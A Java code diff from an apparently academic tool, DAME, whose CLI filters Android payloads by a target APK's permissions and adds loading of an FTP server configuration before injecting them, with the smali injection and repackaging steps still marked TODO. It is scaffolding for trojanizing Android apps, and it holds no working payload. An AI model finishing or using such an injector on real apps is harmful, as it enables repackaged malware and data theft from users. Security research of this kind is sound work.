@@ -1,8 +1,9 @@
 package it.unisannio.srss.dame.cli;
 
 import it.unisannio.srss.dame.android.payloads.Payload;
-import it.unisannio.srss.dame.injection.Permission;
-import it.unisannio.srss.dame.injection.UsagePoint;
+import it.unisannio.srss.dame.model.FTPServerConfig;
+import it.unisannio.srss.dame.model.Permission;
+import it.unisannio.srss.dame.model.UsagePoint;
 import it.unisannio.srss.utils.FileUtils;
 
 import java.io.BufferedReader;
@@ -34,11 +35,13 @@ public class Dame {
 
 	private final static String PAYLOADS_BASE_PACKAGE = "it.unisannio.srss.android.payloads";
 	private final static String APKTOOL_DEFAULT_PATH = "tools/apktool";
-	private final static String ANDROGUARD_DEFAULT_PATH = "androguard";
+	private final static String ANDROGUARD_DEFAULT_PATH = "~/tools/androguard";
 	private final static String PYTHON_DEFAULT_PATH = "python";
 
 	private final static String PERMISSIONS_SCRIPT_PATH = "scripts/permission_extractor.py";
 	private final static String SMALI_TO_APK_SCRIPT_PATH = "scripts/smaliToSignedApk.py";
+
+	private final static String DEFAULT_SERVER_CONFIG_FILE = "config.properties";
 
 	private String apkIn = null;
 	private String apkOut = null;
@@ -103,13 +106,13 @@ public class Dame {
 		Map<String, Set<UsagePoint>> apkPermissions = getAPKPermissions();
 		Iterator<Payload> i = payloads.iterator();
 		Payload p;
-		while(i.hasNext()){
+		while (i.hasNext()) {
 			p = i.next();
 			boolean applicable = true;
-			for(String permission : p.getConfig().getPermissions())
-				if(!apkPermissions.containsKey(permission))
-					applicable=false;
-			if(!applicable)
+			for (String permission : p.getConfig().getPermissions())
+				if (!apkPermissions.containsKey(permission))
+					applicable = false;
+			if (!applicable)
 				i.remove();
 		}
 		return payloads;
@@ -132,16 +135,14 @@ public class Dame {
 		return payloads;
 	}
 
-	public Map<String, Set<UsagePoint>> getAPKPermissions()
-			throws IOException {
+	public Map<String, Set<UsagePoint>> getAPKPermissions() throws IOException {
 		File script = FileUtils.checkFile(PERMISSIONS_SCRIPT_PATH);
 		File apkIn = FileUtils.checkFile(this.apkIn);
 		FileUtils.checkDir(androguardPath);
 
 		StringBuffer outputBuffer = new StringBuffer();
-		int exitCode = exec(outputBuffer, pythonPath,
-				script.getAbsolutePath(), apkIn.getAbsolutePath(),
-				androguardPath);
+		int exitCode = exec(outputBuffer, pythonPath, script.getAbsolutePath(),
+				apkIn.getAbsolutePath(), androguardPath);
 		String output = outputBuffer.toString();
 		if (exitCode != 0) {
 			log.error(output);
@@ -157,14 +158,34 @@ public class Dame {
 					new HashSet<UsagePoint>(permission.getUsagePoints()));
 		return res;
 	}
-	
-	public void inject(List<Payload> payloads){
-		// TODO load server config (default config.properties nella stessa cartella di apkIn)
+
+	public void inject(List<Payload> payloads) throws IOException {
+		FTPServerConfig ftpServerConfig;
+		try {
+			ftpServerConfig = getServerConfig();
+		} catch (IOException e) {
+			log.error("Unable to locate the FTP server configuration.", e);
+			throw e;
+		}
+		log.info("FTP server configuration sucessfully loaded");
+		log.debug(ftpServerConfig.toString());
+		
 		// TODO apk to smali
 		// TODO common injection
 		// TODO call injection
 		// TODO smali to apk (default out.apk nella stessa cartella di apkIn)
 		// TODO rimozione dati temporanei
+	}
+
+	private FTPServerConfig getServerConfig() throws IOException {
+		if (serverConfigPath == null) {
+			// se non è stato impostato, si usa il default
+			String path = (new File(apkIn)).getParent();
+			if (!path.endsWith(File.separator))
+				path += File.separator;
+			serverConfigPath = path + DEFAULT_SERVER_CONFIG_FILE;
+		}
+		return FTPServerConfig.loadFromFile(serverConfigPath);
 	}
 
 	/**
@@ -175,7 +196,8 @@ public class Dame {
 	 *            l'output.
 	 * @param commandAndArgs
 	 *            Comando da eseguire, seguito dai parametri.
-	 * @return Il codice di uscita dell'esecuzione. Viene restituito -1 se l'esecuzione viene interrotta.
+	 * @return Il codice di uscita dell'esecuzione. Viene restituito -1 se
+	 *         l'esecuzione viene interrotta.
 	 * @throws IOException
 	 * @throws InterruptedException
 	 */
@@ -193,7 +215,8 @@ public class Dame {
 		try {
 			exitCode = p.waitFor();
 		} catch (InterruptedException e) {
-			log.error("Command execution interrupted: " + Arrays.toString(commandAndArgs));
+			log.error("Command execution interrupted: "
+					+ Arrays.toString(commandAndArgs));
 			reader.close();
 			return -1;
 		}
